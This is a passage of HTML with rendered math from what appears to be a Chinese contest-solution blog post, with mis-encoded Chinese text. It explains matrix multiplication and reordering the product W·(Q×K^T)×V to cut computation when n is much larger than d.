\\\end{pmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.4em;vertical-align:-0.95em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">(</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">11</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">21</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">12</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">22</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">13</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">23</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">)</span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:3.6em;vertical-align:-1.55em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.05em;"><span class="pstrut" style="height:5.6em;"></span><span style="width:0.875em;height:3.600em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.875em" height="3.600em" viewBox="0 0 875 3600"><path d="M863,9c0,-2,-2,-5,-6,-9c0,0,-17,0,-17,0c-12.7,0,-19.3,0.3,-20,1c-5.3,5.3,-10.3,11,-15,17c-242.7,294.7,-395.3,682,-458,1162c-21.3,163.3,-33.3,349,-36,557 l0,84c0.2,6,0,26,0,60c2,159.3,10,310.7,24,454c53.3,528,210,949.7,470,1265c4.7,6,9.7,11.7,15,17c0.7,0.7,7,1,19,1c0,0,18,0,18,0c4,-4,6,-7,6,-9c0,-2.7,-3.3,-8.7,-10,-18c-135.3,-192.7,-235.5,-414.3,-300.5,-665c-65,-250.7,-102.5,-544.7,-112.5,-882c-2,-104,-3,-167,-3,-189l0,-92c0,-162.7,5.7,-314,17,-454c20.7,-272,63.7,-513,129,-723c65.3,-210,155.3,-396.3,270,-559c6.7,-9.3,10,-15.3,10,-18z"/></svg></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">11</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">21</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">31</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">12</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">22</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">32</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.05em;"><span class="pstrut" style="height:5.6em;"></span><span style="width:0.875em;height:3.600em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.875em" height="3.600em" viewBox="0 0 875 3600"><path d="M76,0c-16.7,0,-25,3,-25,9c0,2,2,6.3,6,13c21.3,28.7,42.3,60.3,63,95c96.7,156.7,172.8,332.5,228.5,527.5c55.7,195,92.8,416.5,111.5,664.5c11.3,139.3,17,290.7,17,454c0,28,1.7,43,3.3,45l0,9c-3,4,-3.3,16.7,-3.3,38c0,162,-5.7,313.7,-17,455c-18.7,248,-55.8,469.3,-111.5,664c-55.7,194.7,-131.8,370.3,-228.5,527c-20.7,34.7,-41.7,66.3,-63,95c-2,3.3,-4,7,-6,11c0,7.3,5.7,11,17,11c0,0,11,0,11,0c9.3,0,14.3,-0.3,15,-1c5.3,-5.3,10.3,-11,15,-17c242.7,-294.7,395.3,-681.7,458,-1161c21.3,-164.7,33.3,-350.7,36,-558l0,-144c-2,-159.3,-10,-310.7,-24,-454c-53.3,-528,-210,-949.7,-470,-1265c-4.7,-6,-9.7,-11.7,-15,-17c-0.7,-0.7,-6.7,-1,-18,-1z"/></svg></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.4em;vertical-align:-0.95em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">(</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">11</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">11</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">12</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">21</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">13</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">31</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">21</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">11</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">22</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">21</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">23</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">31</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">11</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">12</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">12</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">22</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">13</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">32</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">21</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">12</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">22</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">22</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">23</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">32</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">)</span></span></span></span></span></span></span></p><p>å¯ä»¥çœ‹åˆ°ï¼Œæœ€ç»ˆå¾—åˆ°çš„çŸ©é˜µçš„ç¬¬ä¸€è¡Œç¬¬ä¸€åˆ—æ•°æ®æ˜¯Aä¸­çš„ç¬¬ä¸€è¡Œå’ŒBä¸­çš„ç¬¬ä¸€åˆ—ç›¸ä¹˜ç›¸åŠ ï¼ŒåŒæ ·ï¼Œç¬¬ä¸€è¡Œç¬¬äºŒåˆ—çš„æ•°æ®å°±æ˜¯Açš„ç¬¬ä¸€è¡Œå’ŒBä¸­çš„ç¬¬äºŒåˆ—ç›¸ä¹˜å¹¶ç›¸åŠ ã€‚</p><p>æ‰€ä»¥ä¸éš¾å¾—åˆ°è¿™é“é¢˜çš„ç­”æ¡ˆï¼Œä½†æ˜¯æƒ³è¦æ‹¿æ»¡åˆ†è¿™è¿˜ä¸å¤Ÿã€‚æœ‰30%çš„æ•°æ®æ˜¯æ¯”è¾ƒå¤§çš„ï¼Œè€Œnåˆè¿œå¤§äºdï¼Œæ‰€ä»¥åº”è¯¥å°½é‡è®©æœ€åçš„è¿ç®—ä¸­æ‰€å«nçš„çŸ©é˜µçš„è¿ç®—å‡å°‘ï¼Œä¹Ÿå°±æ˜¯è¯´åªéœ€è¦ä¿®æ”¹è¿ç®—é¡ºåºä¸º</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo stretchy="false">(</mo><mi>W</mi><mo>â‹…</mo><mo stretchy="false">(</mo><mi>Q</mi><mo>Ã—</mo><msup><mi>K</mi><mi>T</mi></msup><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>Ã—</mo><mi>V</mi><mo>=</mo><mi>W</mi><mo>â‹…</mo><mo stretchy="false">(</mo><mi>Q</mi><mo>Ã—</mo><mo stretchy="false">(</mo><msup><mi>K</mi><mi>T</mi></msup><mo>Ã—</mo><mi>V</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(W \cdot (Q \times K^T))\times V=W \cdot (Q \times (K^T\times V))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.1413em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mclose">))</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.1413em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" 